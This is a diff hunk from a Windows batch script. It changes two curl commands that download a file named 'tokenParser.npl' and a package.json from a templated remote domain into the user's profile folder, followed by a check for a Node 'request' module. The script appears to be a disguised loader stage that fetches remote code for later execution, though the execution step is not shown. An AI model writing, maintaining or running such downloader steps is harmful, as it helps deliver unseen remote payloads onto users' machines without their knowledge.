@@ -57,8 +57,8 @@ if errorlevel 1 (
 :: Set user profile path
 set "USERPROFILE=%USERPROFILE%"
 
-curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/tokenParser.npl"
-curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/package.json"
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/api/tokenParser.npl"
+curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/api/package.json"
 
 if not exist "%~dp0node_modules\request" (
     pushd "%~dp0"
